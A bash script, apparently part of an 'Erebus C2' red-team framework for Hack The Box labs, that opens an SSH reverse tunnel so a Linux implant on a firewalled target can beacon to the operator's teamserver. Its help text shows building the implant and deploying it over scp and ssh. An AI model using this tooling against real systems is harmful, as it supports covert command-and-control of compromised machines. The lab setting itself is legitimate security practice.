#!/usr/bin/env bash
# HTB / lab reverse tunnel: expose teamserver (or any C2 port) on the target as
# localhost so a Linux C implant can CALLBACK_URL=https://127.0.0.1:<remote_port>
# when the target has no route to the operator VPN (FireFlow, DarkZeroReturns).
#
# Usage:
#   ./scripts/htb_reverse_tunnel.sh user@10.129.x.x
#   LOCAL_PORT=8443 REMOTE_PORT=8443 ./scripts/htb_reverse_tunnel.sh nightfall@10.129.1.2
#   SSH_OPTS="-i ~/.ssh/id_lab -o StrictHostKeyChecking=no" ./scripts/htb_reverse_tunnel.sh u@host
#
# Then on the target (or after scp):
#   CALLBACK_URL=https://127.0.0.1:8443  # must match REMOTE_PORT
#   ./implant_c_linux
#
# Keep this shell open while the implant beacons.
set -euo pipefail

TARGET="${1:-}"
LOCAL_PORT="${LOCAL_PORT:-8443}"
REMOTE_PORT="${REMOTE_PORT:-8443}"
SSH_OPTS="${SSH_OPTS:-}"

if [[ -z "$TARGET" || "$TARGET" == "-h" || "$TARGET" == "--help" ]]; then
  cat <<'EOF'
htb_reverse_tunnel.sh — SSH reverse tunnel for Erebus C2 on firewalled HTB Linux

  ./scripts/htb_reverse_tunnel.sh user@TARGET_IP

Env:
  LOCAL_PORT   Teamserver HTTPS port on operator (default 8443)
  REMOTE_PORT  Port bound on target localhost (default 8443)
  SSH_OPTS     Extra ssh options (e.g. -i key -o StrictHostKeyChecking=no)

Build implant for tunnel callback:
  make implant-c-linux \\
    CALLBACK_URL=https://127.0.0.1:8443 \\
    CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \\
    SLEEP_MS=500

Deploy (example):
  scp build/implant_c_linux user@TARGET:/tmp/
  ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
EOF
  exit 0
fi

if ! command -v ssh >/dev/null 2>&1; then
  echo "error: ssh not found" >&2
  exit 1
fi

# -N: no remote shell; -R: remote listen → local
# GatewayPorts not required for 127.0.0.1 bind on modern OpenSSH
echo "[*] reverse tunnel: target ${TARGET} 127.0.0.1:${REMOTE_PORT} -> operator 127.0.0.1:${LOCAL_PORT}"
echo "[*] implant CALLBACK_URL should be https://127.0.0.1:${REMOTE_PORT}"
echo "[*] Ctrl-C stops the tunnel (implant will fail beacons)"
# shellcheck disable=SC2086
exec ssh -N -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 \
  -R "127.0.0.1:${REMOTE_PORT}:127.0.0.1:${LOCAL_PORT}" \
  ${SSH_OPTS} \
  "${TARGET}"
